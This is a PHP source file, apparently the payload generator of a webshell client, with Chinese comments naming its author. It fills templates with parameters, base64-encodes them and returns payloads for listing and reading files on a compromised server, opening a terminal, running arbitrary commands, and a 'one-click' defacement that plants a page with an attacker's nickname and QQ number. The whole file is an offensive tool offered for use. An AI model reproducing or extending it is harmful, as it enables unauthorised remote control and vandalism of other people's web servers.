<?php
/**
 * 函数名称：代码模板替换
 * 函数作者：陌小离
 * 函数用法：get_tpl(模板名称,替换内容,替换数据)
 */
function get_tpl($tpl_name,$tpl_content,$tpl_data){
	$content = str_replace('{'.$tpl_name.'}',$tpl_content,$tpl_data);
	return $content;
}
/**
 * 代码名称：连接代码
 * 代码作者：陌小离
 */
function link_code($content){
	$tpl_data = file_get_contents('./code/tpl/link.code.tpl');
	$code = get_tpl('content',$content,$tpl_data);
	return base64_encode($code);
}
/**
 * 代码名称：文件列表
 * 代码作者：陌小离
 */
function file_code($dir){
	$tpl_data = file_get_contents('./code/tpl/file.code.tpl');
	$code = get_tpl('dir',$dir,$tpl_data);
	return base64_encode($code);
}
/**
 * 代码名称：文件路径
 * 代码作者：陌小离
 */
function path_code($link,$pass,$dir){
	$tpl_data = file_get_contents('./code/tpl/path.code.tpl');
	$code_3 = get_tpl('link',$link,$tpl_data);
	$code_2 = get_tpl('pass',$pass,$code_3);
	$code = get_tpl('dir',$dir,$code_2);
	return base64_encode($code);
}
/**
 * 代码名称：读取图片
 * 代码作者：陌小离
 */
function img_code($dir){
	$tpl_data = file_get_contents('./code/tpl/img.code.tpl');
	$code = get_tpl('dir',$dir,$tpl_data);
	return base64_encode($code);
}
/**
 * 代码名称：读取文件
 * 代码作者：陌小离
 */
function text_code($dir){
	$tpl_data = file_get_contents('./code/tpl/text.code.tpl');
	$code = get_tpl('dir',$dir,$tpl_data);
	return base64_encode($code);
}
/**
 * 代码名称：一键挂黑
 * 代码作者：陌小离
 */
function hack_code($nick,$qq,$hack_html='./code/hack/default.html'){
	$tpl_data = file_get_contents('./code/tpl/hack.code.tpl');
	$tpl_hack = file_get_contents($hack_html);
	$tpl_data = get_tpl('h_nick',$nick,get_tpl('h_qq',$qq,$tpl_data));
	$code = get_tpl('content',base64_encode($tpl_hack),$tpl_data);
	return base64_encode($code);
}
/**
 * 代码名称：连接终端
 * 代码作者：陌小离
 */
function cmdl_code(){
	$tpl_data = file_get_contents('./code/tpl/cmd-l.code.tpl');
	$code = $tpl_data;
	return base64_encode($code);
}
/**
 * 代码名称：执行命令
 * 代码作者：陌小离
 */
function cmd_code($cmd){
	$tpl_data = file_get_contents('./code/tpl/cmd.code.tpl');
	$code = get_tpl('cmd',$cmd,$tpl_data);
	return base64_encode($code);
}
?>